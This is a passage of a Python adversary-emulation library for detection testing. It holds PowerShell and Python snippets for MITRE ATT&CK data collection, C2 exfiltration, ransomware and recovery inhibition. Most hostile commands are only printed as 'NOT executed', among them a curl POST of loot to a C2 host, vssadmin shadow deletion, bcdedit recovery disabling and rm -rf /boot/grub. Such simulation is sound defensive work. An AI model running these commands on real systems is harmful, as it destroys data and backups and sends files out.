}
Write-Host "  ├─ Simulating: xcopy /s /e data C:\\staging\\ (NOT executed)"
Write-Host "  └─ [DETECTION POINT] Mass file access / staging for exfiltration" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1005 - Data Collection
import subprocess, time, os
print("[SIMULATION] Data collection simulation")
time.sleep(1)
extensions = [".pdf", ".docx", ".xlsx", ".key", ".pem"]
home = os.path.expanduser("~")
for ext in extensions:
    r = subprocess.run(["find", home, "-name", f"*{ext}", "-maxdepth", "3"],
                       capture_output=True, text=True, timeout=5)
    count = len(r.stdout.splitlines())
    if count > 0:
        print(f"  ├─ {ext} files found: {count}")
print("  ├─ Simulating: tar czf /tmp/loot.tar.gz ~/Documents (NOT executed)")
print("  └─ [DETECTION POINT] Mass file read / data staging behavior")
""",
        "detection_notes": "Mass file access patterns, staging directory creation, file archiving (zip/tar) of sensitive data.",
    },

    # ── EXFILTRATION ─────────────────────────────────────────────

    "T1041": {
        "name": "Exfiltration Over C2 Channel",
        "tactic": "Exfiltration",
        "windows": """\
# [SIMULATION] T1041 - Exfiltration via C2
Write-Host "[SIMULATION] Exfiltration simulation" -ForegroundColor Yellow
Start-Sleep -Seconds 1

$c2Domain = "simulation-c2.example.com"  # Non-existent domain
Write-Host "  ├─ C2 domain: $c2Domain (simulated, non-existent)"
Write-Host "  ├─ Pattern: Invoke-WebRequest -Uri http://$c2Domain/upload -Method POST"
Write-Host "  ├─ Simulating DNS query for C2 domain..."

# Safe: DNS query to non-existent simulation domain (generates telemetry)
try {
    Resolve-DnsName $c2Domain -ErrorAction Stop | Out-Null
} catch {
    Write-Host "  ├─ DNS query attempted (expected failure for simulation domain)"
}
Write-Host "  ├─ Data size simulated: 47.3 MB compressed"
Write-Host "  └─ [DETECTION POINT] C2 communication / data exfiltration pattern" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1041 - Exfiltration Over C2
import subprocess, time
print("[SIMULATION] Exfiltration simulation")
time.sleep(1)
c2_domain = "simulation-c2.example.com"  # Non-existent
print(f"  ├─ C2 domain: {c2_domain} (simulated)")
# Safe: DNS lookup of non-existent simulation domain
r = subprocess.run(["nslookup", c2_domain], capture_output=True, text=True, timeout=5)
print(f"  ├─ DNS query attempted (expected failure)")
print("  ├─ Simulating: curl -X POST http://c2/upload -d @loot.tar.gz (NOT executed)")
print("  └─ [DETECTION POINT] C2 beacon / exfiltration traffic")
""",
        "detection_notes": "DNS queries to newly registered/suspicious domains, large outbound data transfers, beacon patterns (periodic connections), tunneling over HTTP/DNS.",
    },

    # ── IMPACT ────────────────────────────────────────────────────

    "T1486": {
        "name": "Data Encrypted for Impact (Ransomware)",
        "tactic": "Impact",
        "windows": """\
# [SIMULATION] T1486 - Ransomware Simulation
Write-Host "[SIMULATION] Ransomware behavior simulation" -ForegroundColor Yellow
Write-Host "  ⚠️  SAFE SIMULATION ONLY - No files will be encrypted" -ForegroundColor Magenta
Start-Sleep -Seconds 2

# Create simulation directory (safe)
$simDir = "$env:TEMP\\ransomware_simulation"
New-Item -ItemType Directory -Path $simDir -Force | Out-Null

# Create safe marker files (not real files)
1..5 | ForEach-Object {
    $file = "$simDir\\document_$_.txt.SIMULATED_ENCRYPTED"
    "SIMULATION: This file would be encrypted in real attack" | Out-File $file
    Write-Host "  ├─ Simulated encrypted file: document_$_.txt.SIMULATED_ENCRYPTED"
}

Write-Host "  ├─ Simulating: vssadmin delete shadows /all /quiet (NOT executed)"
Write-Host "  ├─ Simulating: bcdedit /set {default} recoveryenabled No (NOT executed)"
Write-Host "  ├─ Ransom note marker: $simDir\\README_RESTORE.txt"
"[SIMULATION] This is a ransom note simulation" | Out-File "$simDir\\README_RESTORE.txt"
Write-Host "  └─ [DETECTION POINT] CRITICAL - Ransomware behavior detected" -ForegroundColor Red

Write-Host "`n  [CLEANUP] Removing simulation files..."
Remove-Item $simDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "  [CLEANUP] Done" -ForegroundColor Green
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1486 - Ransomware
import os, time, tempfile, shutil

print("[SIMULATION] Ransomware behavior simulation")
print("  ⚠  SAFE SIMULATION - No real encryption")
time.sleep(2)

sim_dir = os.path.join(tempfile.gettempdir(), "ransomware_simulation")
os.makedirs(sim_dir, exist_ok=True)

for i in range(1, 6):
    path = os.path.join(sim_dir, f"document_{i}.SIMULATED_ENCRYPTED")
    with open(path, "w") as f:
        f.write("[SIMULATION] Encrypted file marker\\n")
    print(f"  ├─ Simulated file: document_{i}.SIMULATED_ENCRYPTED")

print("  ├─ Simulating: find / -type f -exec encrypt {} \\; (NOT executed)")
print("  ├─ Simulating: vssadmin equivalent / shadow copy deletion")
print("  └─ [DETECTION POINT] CRITICAL - Ransomware/mass file modification")

print("\\n  [CLEANUP] Removing simulation files...")
shutil.rmtree(sim_dir, ignore_errors=True)
print("  [CLEANUP] Done")
""",
        "detection_notes": "CRITICAL: Mass file modification/encryption, ransom note creation, shadow copy deletion (vssadmin), backup catalog destruction, process injection for encryption.",
    },

    "T1490": {
        "name": "Inhibit System Recovery",
        "tactic": "Impact",
        "windows": """\
# [SIMULATION] T1490 - Inhibit System Recovery
Write-Host "[SIMULATION] Recovery inhibition simulation" -ForegroundColor Yellow
Write-Host "  ⚠️  SAFE SIMULATION - No actual recovery mechanisms will be disabled" -ForegroundColor Magenta
Start-Sleep -Seconds 1

Write-Host "  ├─ Pattern: vssadmin delete shadows /all /quiet (NOT executed)"
Write-Host "  ├─ Pattern: wbadmin delete catalog -quiet (NOT executed)"
Write-Host "  ├─ Pattern: bcdedit /set {default} bootstatuspolicy ignoreallfailures (NOT executed)"
Write-Host "  ├─ Pattern: bcdedit /set {default} recoveryenabled No (NOT executed)"

# Safe: just query current VSS status
$vss = Get-Service VSS -ErrorAction SilentlyContinue
Write-Host "  ├─ VSS Service status: $($vss.Status)"
$shadows = vssadmin list shadows 2>&1 | Select-String "Shadow Copy"
Write-Host "  ├─ Existing shadow copies: $($shadows.Count)"
Write-Host "  └─ [DETECTION POINT] Recovery mechanism tampering attempt" -ForegroundColor Red
""",
        "linux": """\
#!/usr/bin/env python3
# [SIMULATION] T1490 - Inhibit System Recovery
import subprocess, time
print("[SIMULATION] Recovery inhibition simulation")
print("  ⚠  SAFE SIMULATION - No recovery mechanisms modified")
time.sleep(1)
print("  ├─ Simulating: rm -rf /boot/grub (NOT executed)")
print("  ├─ Simulating: systemctl disable --now systemd-journald (NOT executed)")
r = subprocess.run(["df", "-h", "/"], capture_output=True, text=True)
print(f"  ├─ Root filesystem: {r.stdout.splitlines()[1] if len(r.stdout.splitlines()) > 1 else 'N/A'}")
print("  └─ [DETECTION POINT] Boot/recovery mechanism tampering")
""",
        "detection_notes": "vssadmin/wbadmin execution, bcdedit modifications, backup service disruption, boot sector modifications.",
    },
}


def get_emulation_snippet(technique_id: str, platform: str = "windows") -> Optional[Dict]:
    """
    Returns the emulation snippet for a given technique ID and platform.
    Supports both exact IDs (T1003.001) and parent IDs (T1003).

    Args:
        technique_id: MITRE ATT&CK technique ID (e.g., "T1003" or "T1003.001")
        platform: Target platform ("windows" or "linux")

    Returns:
        Dict with keys: name, tactic, code, detection_notes
        or None if not found
    """
    entry = EMULATION_LIBRARY.get(technique_id)

    # Fallback: try parent technique
    if not entry and "." in technique_id:
        parent_id = technique_id.split(".")[0]
        entry = EMULATION_LIBRARY.get(parent_id)

    if not entry:
        return None

    code = entry.get(platform) or entry.get("windows")  # fallback to windows

    return {
        "technique_id": technique_id,
        "name": entry["name"],
        "tactic": entry["tactic"],
        "platform": platform,
        "code": code,
        "detection_notes": entry["detection_notes"],
    }


def get_all_covered_techniques() -> list:
    """Returns list of all technique IDs covered by the library."""
    return list(EMULATION_LIBRARY.keys())
